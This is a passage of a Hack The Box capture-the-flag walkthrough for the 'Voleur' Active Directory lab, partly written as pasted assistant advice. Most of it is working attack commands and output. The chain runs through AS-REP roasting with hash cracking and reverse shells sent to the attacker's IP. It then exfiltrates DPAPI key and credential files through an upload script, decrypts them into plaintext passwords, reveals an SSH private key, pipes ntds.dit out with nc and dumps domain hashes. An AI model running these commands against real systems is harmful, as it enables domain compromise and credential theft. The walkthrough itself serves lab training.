KRB5CCNAME=/tmp/krb5cc_1000 faketime 'now + 8 hours' bloodyAD -d voleur.htb -k --dc-ip 10.10.11.76 --host dc.voleur.htb add uac -f DONT_REQ_PREAUTH LACEY.MILLER
 
# output
[-] ['DONT_REQ_PREAUTH'] property flags added to LACEY.MILLER's userAccountControl
```

because you (specifically, your group `RESTORE_USERS@VOLEUR.HTB`) have **GenericWrite** privileges on the account `LACEY.MILLER`. This means you can modify her account properties, including enabling the **"Don't require Kerberos preauthentication"** (`DONT_REQ_PREAUTH`) setting.

---

##  **Why Enable "Don't Require Pre-authentication"?**

* **Kerberoasting vs AS-REP Roasting:**

  * Regular Kerberoasting requires the account to have an SPN configured.
  * **AS-REP roasting** targets accounts with pre-authentication disabled (`DONT_REQ_PREAUTH`) and **does not require an SPN**.

By disabling Kerberos pre-authentication on `LACEY.MILLER`, you explicitly make her account vulnerable to an **AS-REP roast** attack.

---

##  **Performing the Attack (AS-REP Roasting)**

After running the command above, you can immediately roast the account using:

```bash
faketime 'now + 8 hours' impacket-GetNPUsers voleur.htb/LACEY.MILLER -dc-ip 10.10.11.76 -no-pass
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for lacey.miller
$krb5asrep$23$lacey.miller@VOLEUR.HTB:44ee033ad532f6c9d7679b98a8387d0d$166f57997706f804d4a138bc1ba52567c6b392ab6e621f280154653a737dddf96a0bedad399f8f31624866b4791da8cacd3bc5b6543e0638e3a5824e092b99fe9537e51a96c18f74b551d4f700eb7845874735cf3cb43748b170b5c274ebbeb7ac5b5379608fb6b89d8bb9027a03934a18764b3e4775511b6f4a6a89379bb3d5a3e556a45d68bc8011133c50ebb7a9f42a142a8bcb760d030d39ae23ffa88208507bee186f5bb0496b37c46f438793656a567864c49ded2a3c046bf9679fbe1d24a79fa7f4c31bb87907628e55eeebc056424213f50f278ca496d8f841eaf99de2b2693915bf1b17

```

You'll then get an AS-REP hash, which can be cracked offline:

```bash
(jrioswarmonger)-[~/Documents/HTB/Machines/voleur]
$ hashcat -a 0 -m 18200 lacey.miller_as-rep.hash /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6-1184-g5ffbc5edc) starting

HIP API (HIP 6.4.43483)
=======================
* Device #01: AMD Radeon RX 6900 XT, 16176/16368 MB, 40MCU

OpenCL API (OpenCL 2.1 AMD-APP (3649.0)) - Platform #1 [Advanced Micro Devices, Inc.]
=====================================================================================
* Device #02: AMD Radeon RX 6900 XT, skipped

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
====================================================================================================================================================
* Device #03: cpu-haswell-AMD Ryzen Threadripper 2970WX 24-Core Processor, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 863 MB (75627 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Approaching final keyspace - workload adjusted.           

Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$lacey.miller@VOLEUR.HTB:44ee033ad532f...bf1b17
Time.Started.....: Fri Jul 11 23:41:43 2025 (1 sec)
Time.Estimated...: Fri Jul 11 23:41:44 2025 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........: 16450.8 kH/s (7.48ms) @ Accel:1024 Loops:1 Thr:32 Vec:1
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: 191289071089 -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#01.: Temp: 49c Fan: 14% Util:  8% Core:2610MHz Mem:1000MHz Bus:16

Started: Fri Jul 11 23:41:42 2025
Stopped: Fri Jul 11 23:41:45 2025
```

---

##  **Is There a Way to Directly Kerberoast (`TGS`) Instead?**

* **Regular Kerberoasting** (TGS roasting) requires the target user to have an SPN.
* **If Lacey Miller does not currently have an SPN**, you cannot directly Kerberoast her.
* Your provided BloodHound output indicates you have **GenericWrite** (but not necessarily **WriteSPN**) on `LACEY.MILLER`. You could theoretically use this permission to set an SPN for her account first and then Kerberoast it.
* However, enabling **DONT\_REQ\_PREAUTH** and performing **AS-REP roasting** is simpler and requires fewer steps.

---


## Let's run RunasCs.exe but 1st we need to download it to the target machine.

### Let's setup the server to host the `RunasCs.exe` file:
```bash
$ sudo php -S 0.0.0.0:1337
[Sat Jul 12 00:50:06 2025] PHP 8.4.8 Development Server (http://0.0.0.0:1337) started
[Sat Jul 12 00:51:53 2025] 10.10.11.76:54040 Accepted
[Sat Jul 12 00:51:53 2025] 10.10.11.76:54040 [200]: GET /RunasCs.exe
[Sat Jul 12 00:51:53 2025] 10.10.11.76:54040 Closing
```


### Download the `RunasCs.exe` file to the target machine:
```powershell
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> Invoke-WebRequest -Uri "http://10.10.14.21:1337/RunasCs.exe" -OutFile "RunasCs.exe"
```

### Now we can run the `RunasCs.exe` file and connect back to our machine on port 1338:
### Note: I had to download the files from the github repository [RunasCs](https://github.com/antonioCoco/RunasCs/releases/tag/v1.5) and upload it to the target machine using Evil-WinRM.
```powershell
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> .\RunasCs.exe "svc_ldap" 'M1XyC9pW7qT5Vn' powershell.exe -r 10.10.14.21:1338
[*] Warning: The logon for user 'svc_ldap' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-3246bfe$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 6696 created in background.

```

### Now we can connect back to our machine on port 1338:
```bash
$ nc -nvlp 1338
listening on [any] 1338 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.11.76] 54148
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> 

```
### From the reverse shell we can run commands as the `svc_ldap` user:
```powershell
PS C:\Windows\system32> Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *

CanonicalName                   : voleur.htb/Deleted Objects
CN                              : Deleted Objects
Created                         : 1/29/2025 12:42:27 AM
createTimeStamp                 : 1/29/2025 12:42:27 AM
Deleted                         : True
Description                     : Default container for deleted objects
DisplayName                     : 
DistinguishedName               : CN=Deleted Objects,DC=voleur,DC=htb
dSCorePropagationData           : {12/31/1600 4:00:00 PM}
instanceType                    : 4
isCriticalSystemObject          : True
isDeleted                       : True
LastKnownParent                 : 
Modified                        : 1/29/2025 4:44:42 AM
modifyTimeStamp                 : 1/29/2025 4:44:42 AM
Name                            : Deleted Objects
ObjectCategory                  : CN=Container,CN=Schema,CN=Configuration,DC=voleur,DC=htb
ObjectClass                     : container
ObjectGUID                      : 587cd8b4-6f6a-46d9-8bd4-8fb31d2e18d8
ProtectedFromAccidentalDeletion : 
sDRightsEffective               : 0
showInAdvancedViewOnly          : True
systemFlags                     : -1946157056
uSNChanged                      : 13005
uSNCreated                      : 5659
whenChanged                     : 1/29/2025 4:44:42 AM
whenCreated                     : 1/29/2025 12:42:27 AM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : voleur.htb/Deleted Objects/Todd Wolfe
                                  DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
CN                              : Todd Wolfe
                                  DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
codePage                        : 0
countryCode                     : 0
Created                         : 1/29/2025 1:08:06 AM
createTimeStamp                 : 1/29/2025 1:08:06 AM
Deleted                         : True
Description                     : Second-Line Support Technician
DisplayName                     : Todd Wolfe
DistinguishedName               : CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted 
                                  Objects,DC=voleur,DC=htb
dSCorePropagationData           : {5/13/2025 4:11:10 PM, 1/29/2025 4:52:29 AM, 1/29/2025 4:49:29 AM, 1/29/2025 1:08:06 
                                  AM...}
givenName                       : Todd
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=Second-Line Support Technicians,DC=voleur,DC=htb
lastLogoff                      : 0
lastLogon                       : 133826301603754403
lastLogonTimestamp              : 133826287869758230
logonCount                      : 3
memberOf                        : {CN=Second-Line Technicians,DC=voleur,DC=htb, CN=Remote Management 
                                  Users,CN=Builtin,DC=voleur,DC=htb}
Modified                        : 5/13/2025 4:11:17 PM
modifyTimeStamp                 : 5/13/2025 4:11:17 PM
msDS-LastKnownRDN               : Todd Wolfe
Name                            : Todd Wolfe
                                  DEL:1c6b1deb-c372-4cbb-87b1-15031de169db
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  : 
ObjectClass                     : user
ObjectGUID                      : 1c6b1deb-c372-4cbb-87b1-15031de169db
objectSid                       : S-1-5-21-3927696377-1337352550-2781715495-1110
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133826280731790960
sAMAccountName                  : todd.wolfe
sDRightsEffective               : 0
sn                              : Wolfe
userAccountControl              : 66048
userPrincipalName               : todd.wolfe@voleur.htb
uSNChanged                      : 45088
uSNCreated                      : 12863
whenChanged                     : 5/13/2025 4:11:17 PM
whenCreated                     : 1/29/2025 1:08:06 AM
```

### We can see that the user `Todd Wolfe` has the `Second-Line Technicians` group and the `Remote Management Users` group.
```powershell
# let's restore the user `Todd Wolfe`:
PS C:\Windows\system32> Restore-ADObject -Identity "CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb"
# command output:
Restore-ADObject -Identity "CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db,CN=Deleted Objects,DC=voleur,DC=htb"

PS C:\Users\svc_ldap> Get-ADUser todd.wolfe
Get-ADUser todd.wolfe


DistinguishedName : CN=Todd Wolfe,OU=Second-Line Support Technicians,DC=voleur,DC=htb
Enabled           : True
GivenName         : Todd
Name              : Todd Wolfe
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
SamAccountName    : todd.wolfe
SID               : S-1-5-21-3927696377-1337352550-2781715495-1110
Surname           : Wolfe
UserPrincipalName : todd.wolfe@voleur.htb

```

## Breakd down the command:
* `Restore-ADObject`: PowerShell cmdlet to restore a deleted Active Directory object.
* `-Identity`: Specifies the object to restore, in this case, the deleted user `Todd Wolfe`.
* `CN=Todd Wolfe\0ADEL:1c6b1deb-c372-4cbb-87b1-15031de169db`: The distinguished name of the deleted user object, including the unique identifier for the deletion.

### Now we can see that the user `Todd Wolfe` is restored:
```powershell
PS C:\Users\svc_ldap> Get-ADUser todd.wolfe
Get-ADUser todd.wolfe


DistinguishedName : CN=Todd Wolfe,OU=Second-Line Support Technicians,DC=voleur,DC=htb
Enabled           : True
GivenName         : Todd
Name              : Todd Wolfe
ObjectClass       : user
ObjectGUID        : 1c6b1deb-c372-4cbb-87b1-15031de169db
SamAccountName    : todd.wolfe
SID               : S-1-5-21-3927696377-1337352550-2781715495-1110
Surname           : Wolfe
UserPrincipalName : todd.wolfe@voleur.htb

# Now we can run the `RunasCs.exe` file as the user `Todd Wolfe`:
```powershell
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> .\RunasCs.exe "todd.wolfe" 'NightT1meP1dg3on14' powershell.exe -r 10.10.14.21:1337
[*] Warning: The logon for user 'todd.wolfe' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-32fa727$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 4896 created in background.

```


# Windows leanpeas to the rescue:
```powershell
S C:\Users\svc_ldap\Documents> Invoke-WebRequest -Uri "http://10.10.14.21:420/winPEASany.exe" -OutFile "winPEASany.exe"
Invoke-WebRequest -Uri "http://10.10.14.21:420/winPEASany.exe" -OutFile "winPEASany.exe"

PS C:\Users\svc_ldap\Documents> 
PS C:\Users\svc_ldap\Documents> ls
ls


    Directory: C:\Users\svc_ldap\Documents


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----         7/12/2025  10:06 AM       10156032 winPEASany.exe                                                       


PS C:\Users\svc_ldap\Documents> .\winPEASany.exe 
```

Here's how to upload both files to your PHP server using PowerShell from the target machine.

---

##  Step-by-step: Upload 2 DPAPI Files via PowerShell

### ① **Ensure your PHP upload script is running**

Your `upload.php` in the server root should look like this:

```php
<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], __DIR__ . '/uploads/' . basename($_FILES['file']['name']));
    echo "Upload successful";
} else {
    echo "Upload failed";
}
?>
```

Also ensure:

```bash
mkdir uploads
chmod 777 uploads
php -S 0.0.0.0:420
```

---

### ② **Upload from the Windows target**

Use PowerShell to upload both files individually.

####  Upload the **MasterKey**:

```powershell
$wc = New-Object Net.WebClient
$wc.UploadFile(
  "http://10.10.14.21:420/upload.php",
  "C:\it\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Protect\S-1-5-21-3927696377-1337352550-2781715495-1110\08949382-134f-4c63-b93c-ce52efc0aa88"
)
```

####  Upload the **Credential Blob**:

```powershell
$wc.UploadFile(
  "http://10.10.14.21:420/upload.php",
  "C:\it\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials\772275FAD58525253490A9B0039791D3"
)
```

>  Wrap the full file path in quotes and ensure you include the full filename — spaces are handled correctly in PowerShell when quoted.

---

###  After upload

You should see:

```text
[200]: POST /upload.php
```

in your PHP server logs, and the two files will appear under:

```
uploads/08949382-134f-4c63-b93c-ce52efc0aa88
uploads/772275FAD58525253490A9B0039791D3
```

---

Let me know when you're ready to decrypt them with `impacket-dpapi`.

# Decrypting DPAPI Files with `impacket-dpapi`
To decrypt the DPAPI files you uploaded, follow these steps:


```bash
$ impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid 'S-1-5-21-3927696377-1337352550-2781715495-1110' -password 'NightT1meP1dg3on14' 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 08949382-134f-4c63-b93c-ce52efc0aa88
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83
```


# Decrypting the Credential Blob
```bash
(jrioswarmonger)-[~/…/Machines/voleur/dpapi/uploads]
$ impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key  '0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e240ce2b8a9dfb92a0d15969ccae6f550650a83' 
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2025-01-29 12:55:19+00:00
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=Jezzas_Account
Description : 
Unknown     : 
Username    : jeremy.combs
Unknown     : qT3V9pLXyN7W4m

```

# Let's connect to the target machine using the credentials we just decrypted:
```bash
*Evil-WinRM* PS C:\Users\svc_winrm\Documents> .\RunasCs.exe jeremy.combs 'qT3V9pLXyN7W4m' powershell.exe -r 10.10.14.21:1337
[*] Warning: The logon for user 'jeremy.combs' is limited. Use the flag combination --bypass-uac and --logon-type '8' to obtain a more privileged token.

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-3515cfc$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 3204 created in background.

```


# On our reverse shell we found more credentials:
```powershell
PS C:\IT\Third-Line Support> ls      
ls


    Directory: C:\IT\Third-Line Support


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         1/30/2025   8:11 AM                Backups                                                              
-a----         1/30/2025   8:10 AM           2602 id_rsa                                                               
-a----         1/30/2025   8:07 AM            186 Note.txt.txt                                                         


PS C:\IT\Third-Line Support> more id_rsa
more id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

PS C:\IT\Third-Line Support> more Note.txt.txt
more Note.txt.txt
Jeremy,

I've had enough of Windows Backup! I've part configured WSL to see if we can utilize any of the backup tools from Linux.

Please see what you can set up.

Thanks,

Admin


```
# Let's connect via ssh using the credentials we just found:
```bash
(jrioswarmonger)-[~/…/Machines/voleur/dpapi/uploads]
$ ssh svc_backup@voleur.htb -p 2222 -i id_rsa
Welcome to Ubuntu 20.04 LTS (GNU/Linux 4.4.0-20348-Microsoft x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat Jul 12 11:01:13 PDT 2025

  System load:    0.52      Processes:             9
  Usage of /home: unknown   Users logged in:       0
  Memory usage:   51%       IPv4 address for eth0: 10.10.11.76
  Swap usage:     2%


363 updates can be installed immediately.
257 of these updates are security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu Jan 30 04:26:24 2025 from 127.0.0.1
 * Starting OpenBSD Secure Shell server sshd                                                                                                                                                                [ OK ] 
svc_backup@DC:~$ 
# Let's send the `ntds.dit` and `SYSTEM` files to our machine on port 420:
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/Active Directory$ nc -q 0 10.10.14.21 420 < ntds.dit 
svc_backup@DC:/mnt/c/IT/Third-Line Support/Backups/registry$ nc -q 0 10.10.14.21 420 < SYSTEM 
```

# Let's dump the `ntds.dit` file using `impacket-secretsdump`:
```bash
$ impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xbbdd1a32433b87bcc9b875321b883d2d
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 898238e1ccd2ac0016a18c53f4569f40
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e656e07c56d831611b577b160b259ad2:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC$:1000:aad3b435b51404eeaad3b435b51404ee:d5db085d469e3181935d311b72634d77:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5aeef2c641148f9173d663be744e323c:::
voleur.htb\ryan.naylor:1103:aad3b435b51404eeaad3b435b51404ee:3988a78c5a072b0a84065a809976ef16:::
voleur.htb\marie.bryant:1104:aad3b435b51404eeaad3b435b51404ee:53978ec648d3670b1b83dd0b5052d5f8:::
voleur.htb\lacey.miller:1105:aad3b435b51404eeaad3b435b51404ee:2ecfe5b9b7e1aa2df942dc108f749dd3:::
voleur.htb\svc_ldap:1106:aad3b435b51404eeaad3b435b51404ee:0493398c124f7af8c1184f9dd80c1307:::
voleur.htb\svc_backup:1107:aad3b435b51404eeaad3b435b51404ee:f44fe33f650443235b2798c72027c573:::
voleur.htb\svc_iis:1108:aad3b435b51404eeaad3b435b51404ee:246566da92d43a35bdea2b0c18c89410:::
voleur.htb\jeremy.combs:1109:aad3b435b51404eeaad3b435b51404ee:7b4c3ae2cbd5d74b7055b7f64c0b3b4c:::
voleur.htb\svc_winrm:1601:aad3b435b51404eeaad3b435b51404ee:5d7e37717757433b4780079ee9b1d421:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:f577668d58955ab962be9a489c032f06d84f3b66cc05de37716cac917acbeebb
Administrator:aes128-cts-hmac-sha1-96:38af4c8667c90d19b286c7af861b10cc
Administrator:des-cbc-md5:459d836b9edcd6b0
DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
DC$:des-cbc-md5:64e05b6d1abff1c8
krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
krbtgt:des-cbc-md5:34ae31d073f86d20
voleur.htb\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
voleur.htb\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
voleur.htb\ryan.naylor:des-cbc-md5:4376f7917a197a5b
voleur.htb\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
voleur.htb\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
voleur.htb\marie.bryant:des-cbc-md5:cdf1492604d3a220
voleur.htb\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
voleur.htb\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
voleur.htb\lacey.miller:des-cbc-md5:6eef922076ba7675
voleur.htb\svc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
voleur.htb\svc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
voleur.htb\svc_ldap:des-cbc-md5:1ab0fbfeeaef5776
voleur.htb\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
voleur.htb\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
voleur.htb\svc_backup:des-cbc-md5:7ab513f8ab7f765e
voleur.htb\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
voleur.htb\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
voleur.htb\svc_iis:des-cbc-md5:70ce25431c577f92
voleur.htb\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
voleur.htb\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
voleur.htb\jeremy.combs:des-cbc-md5:192f702abff75257
voleur.htb\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
voleur.htb\svc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab
[*] Cleaning up... 
```

## Let's get the root flag:
```bash
# let's get our TGT ticket:
$ KRB5CCNAME=Administrator.ccache evil-winrm -i dc.voleur.htb -r voleur.htb                                                                         

# Now we can connect to the target machine using Evil-WinRM:
